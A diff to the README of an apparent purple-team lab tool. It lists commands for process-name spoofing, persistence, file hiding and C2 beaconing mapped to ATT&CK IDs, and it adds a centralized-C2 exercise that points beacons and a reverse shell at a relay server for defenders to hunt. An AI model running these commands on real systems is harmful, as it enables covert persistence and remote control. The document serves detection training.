@@ -383,7 +383,7 @@ prints an ATT&CK-mapped detection hint, and is undone by `wld lab uninstall`.
 wld lab masquerade --name "[kworker/0:0]"   # T1036  process name spoofing
 wld lab persist --method both                # T1053.003 / T1543.002
 wld lab hide --reference /bin/ls             # T1564.001 / T1070.006
-wld lab beacon --to host:443 --interval 30   # T1071 / T1573 (not real TLS)
+wld lab beacon --to c2:443 --as tls --profile hourly  # T1071/T1573/T1571 (C2)
 wld lab detections                           # print the full detection mapping
 wld lab uninstall                            # remove every WETLAND-LAB artifact
 ```
@@ -396,6 +396,12 @@ wld persist --method both      # same as `wld lab persist --method both`
 wld masquerade --name "[kworker/0:0]"
 wld uninstall
 ```
+
+These compose into a **centralized-C2 exercise**: run `wetland-relay` on a
+lab box as the C2 server, point `wld lab beacon` and an E2E reverse shell
+(`wld -s … -l -i -H C2 -p …`) at it, and have blue hunt the beaconing + the
+long-lived outbound session. Full walkthrough in
+[`docs/PURPLE-LAB.md`](docs/PURPLE-LAB.md).
 
 > ⚠️ Authorized testing only, on systems you own or are cleared to test. The
 > module is built to be *detected*, not to hide — a poor base for a real implant,
